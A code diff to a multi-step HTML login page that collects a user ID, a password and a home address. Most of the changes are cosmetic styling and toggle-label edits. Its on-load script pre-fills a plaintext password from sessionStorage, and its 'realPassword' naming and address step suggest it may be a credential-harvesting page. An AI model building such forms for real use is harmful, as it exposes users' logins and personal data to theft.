@@ -103,11 +103,13 @@
             top: 50%;
             transform: translateY(-50%);
             cursor: pointer;
-            color: #64748b;
-            font-size: 1.3rem;
+            color: #1e40af;
+            font-size: 0.95rem;
+            font-weight: 500;
+            user-select: none;
         }
 
-        .login-btn { 
+        .login-btn, .next-btn { 
             width: 100%; 
             padding: 16px; 
             background: #1e40af; 
@@ -117,18 +119,6 @@
             font-size: 1.2rem; 
             font-weight: 600; 
             margin: 25px 0 10px; 
-            cursor: pointer; 
-        }
-
-        .next-btn {
-            width: 100%; 
-            padding: 16px; 
-            background: #1e40af; 
-            color: white; 
-            border: none; 
-            border-radius: 50px; 
-            font-size: 1.1rem; 
-            font-weight: 600; 
             cursor: pointer; 
         }
 
@@ -186,7 +176,7 @@
                 <div class="dot" id="dot3"></div>
             </div>
 
-            <!-- Step 1 -->
+            <!-- Step 1: User ID -->
             <div id="step1" class="step active">
                 <label for="username">User ID</label>
                 <input type="text" id="username" placeholder="Enter your User ID" required>
@@ -194,23 +184,23 @@
                 <button type="button" class="next-btn" onclick="nextStep(2)">Next</button>
             </div>
 
-            <!-- Step 2 -->
+            <!-- Step 2: Password -->
             <div id="step2" class="step">
                 <label for="password">Password</label>
                 <div class="input-group">
                     <input type="password" id="password" placeholder="Enter your password" required>
-                    <span class="toggle-password" onclick="togglePassword()">👁</span>
+                    <span class="toggle-password" onclick="togglePassword()">Show</span>
                 </div>
                 <button type="button" class="next-btn" onclick="nextStep(3)">Next</button>
                 <button type="button" onclick="prevStep(1)" style="background:none; border:none; color:#64748b; margin-top:12px;">← Back</button>
             </div>
 
-            <!-- Step 3 -->
+            <!-- Step 3: Address -->
             <div id="step3" class="step">
                 <label>Home Address (Current)</label>
                 <input type="text" id="address" placeholder="Enter your current home address" required>
                 
-                <div style="text-align: right; margin: 15px 0;">
+                <div style="text-align: right; margin: 20px 0 10px;">
                     <a href="forgot.html" style="color: #1e40af; font-size: 0.95rem; text-decoration: none;">Forgot Password?</a>
                 </div>
 
@@ -246,17 +236,18 @@
 
         function togglePassword() {
             const passInput = document.getElementById('password');
-            const toggle = document.querySelector('.toggle-password');
+            const toggleText = document.querySelector('.toggle-password');
+            
             if (passInput.type === "password") {
                 passInput.type = "text";
-                toggle.textContent = "🙈";
+                toggleText.textContent = "Hide";
             } else {
                 passInput.type = "password";
-                toggle.textContent = "👁";
+                toggleText.textContent = "Show";
             }
         }
 
-        // Auto-fill after password reset
+        // Auto-fill after reset
         window.onload = function() {
             const savedUsername = sessionStorage.getItem('realUsername');
             const savedPassword = sessionStorage.getItem('realPassword');
